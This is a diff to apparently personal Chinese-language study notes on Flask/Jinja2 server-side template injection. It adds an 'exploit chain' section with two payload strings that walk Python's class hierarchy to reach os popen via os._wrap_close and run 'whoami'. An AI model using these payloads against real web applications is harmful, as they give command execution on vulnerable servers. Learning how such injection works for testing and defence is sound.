@@ -30,8 +30,12 @@ g                    {{g}}得到<flask.g of 'flask_ssti'>
 ```
 ^
 ## **利用链**
+直接使用popen（python2不行）
 ```
+os._wrap_close 类里有popen
 
+"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()
+"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__.popen('whoami').read()
 ```
 
 
